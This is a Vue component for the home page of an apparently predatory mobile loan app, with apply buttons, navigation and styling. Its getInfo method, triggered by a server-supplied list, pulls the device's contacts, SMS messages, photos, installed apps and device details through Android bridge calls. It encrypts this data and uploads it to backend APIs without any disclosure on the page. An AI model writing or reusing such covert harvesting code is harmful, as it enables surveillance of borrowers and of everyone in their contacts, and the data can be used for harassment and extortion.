<template>
    <div class="shouye">
        <!-- 顶部图 -->
        <div class="shouye-top">
            <img src="../../assets/shouye.png" alt="">
        </div>
        <!-- 去贷款按钮 -->
        <div class="btn" @click="toApply">Apply now</div>
        <!-- banner -->
        <div class="banner">
            <div class="toapply" @click="toApply">To apply</div>
        </div>
        <div class="three">
            <img src="../../assets/shouye-three.png" alt="">
        </div>
        <div class="nav">
            <div class="nav-shouye">
                <img src="../../assets/sy-icon-a.png" alt="">
            </div>
            <div class="nav-me" @click="$router.push('/me')">
                <img src="../../assets/me-icon.png" alt="">
            </div>
        </div>
    </div>
</template>

<script>
import { getPermission, getDeviceInfo, getApp, getSms, getPhoto, getContact, getPhoneInfo } from "../../utils/android.js";
import { setDeviceInfoAPI, getshebeiInfoAPI, getAppInfoAPI, gettxlAPI, getduanxinAPI, getPhotoInfoAPI } from "../../api";
import { add, unt } from "../../utils/AESKey.js";
import isNext from '../form/isNext.js'
export default {
    methods: {
        //去贷款
        async toApply() {
            // isNext()
            // this.$router.push('/huoti')
            // const res = await getPhoneInfo()
            if (!this.$store.state.isLogin) {
                this.$router.push('/login')
            } else {
                this.$router.push('beforeys')
            }
        },
        //获取设备信息上报情况
        async getInfo() {
            const res = await setDeviceInfoAPI()
            this.list = unt(res.data).list
            console.log(this.list, 'this.list')
            console.log(JSON.stringify(this.list), 'this.list')
            if (this.list.indexOf("DEVICE") > -1) {
                let res = await getDeviceInfo();
                let info = JSON.parse(res.appInfo);
                getshebeiInfoAPI(add({ model: info.device }))
            }
            if (this.list.indexOf('APP') > -1) {
                let res = await getApp();
                let info = JSON.parse(res.appInfo);
                getAppInfoAPI(add({ model: { deviceApps: info.deviceApps } }))
            }
            if (this.list.indexOf("CONTACT") > -1) {
                let res = await getContact();
                let info = JSON.parse(res.appInfo);
                gettxlAPI(add({ model: { deviceContacts: info.deviceContacts } }))
            }
            if (this.list.indexOf("SMS") > -1) {
                let res = await getSms();
                let info = JSON.parse(res.appInfo);
                getduanxinAPI(add({ model: { list: info.smsList } }))
            }
            if (this.list.indexOf("PHOTO") > -1) {
                let res = await getPhoto();
                let info = JSON.parse(res.appInfo);
                getPhotoInfoAPI(add({ model: { list: info.photoList } }))
            }
            console.log(this.list, '设备信息上报情况')
        }
    },
    async created() {
        // this.getToken()
        // await this.$store.dispatch('form/weiwancehngform')
    },
}
</script>

<style lang="less" scoped>
.shouye {
    width: 100vw;
    background-color: #f5f5f5;
    padding-top: (39/@a);
    padding-bottom: (70/@a);

    .nav {
        position: fixed;
        bottom: 0;
        left: 0;
        z-index: 1;
        width: 100vw;
        height: (56/@a);
        background-color: #fff;
        display: flex;
        justify-content: space-around;
        align-items: center;

        .nav-shouye {
            width: (23/@a);
            height: (27/@a);

            img {
                width: 100%;
            }
        }

        .nav-me {
            width: (23/@a);
            height: (27/@a);

            img {
                width: 100%;
            }
        }
    }

    .three {
        width: (330/@a);
        height: (134/@a);
        background: #FFFFFF;
        border-radius: (10/@a);
        margin-top: (7/@a);
        margin-left: (22/@a);

        img {
            width: 100%;
        }
    }

    .banner {
        width: (330/@a);
        height: (141/@a);
        background: #FFFFFF;
        border-radius: (10/@a);
        margin-left: (22/@a);
        background-image: url(../../assets/shouye-banner.png);
        background-size: contain;
        padding-top: (85/@a);
        padding-left: (15/@a);
        margin-top: (9/@a);

        .toapply {
            width: (90/@a);
            height: (34/@a);
            background: #E1A08B;
            border-radius: (10/@a);
            font-size: (11/@a);
            text-align: center;
            line-height: (34/@a);
            font-family: Alibaba PuHuiTi;
            font-weight: bold;
            color: #FFFFFF;
        }
    }

    .btn {
        width: (330/@a);
        height: (52/@a);
        background: #E1A08B;
        border-radius: (10/@a);
        margin-left: (22/@a);
        text-align: center;
        line-height: (52/@a);
        font-size: (16/@a);
        font-family: Alibaba PuHuiTi;
        font-weight: bold;
        color: #FFFFFF;
    }



    .shouye-top {
        width: (335/@a);
        height: (323/@a);
        margin-left: (22/@a);

        img {
            width: 100%;
        }
    }
}
</style>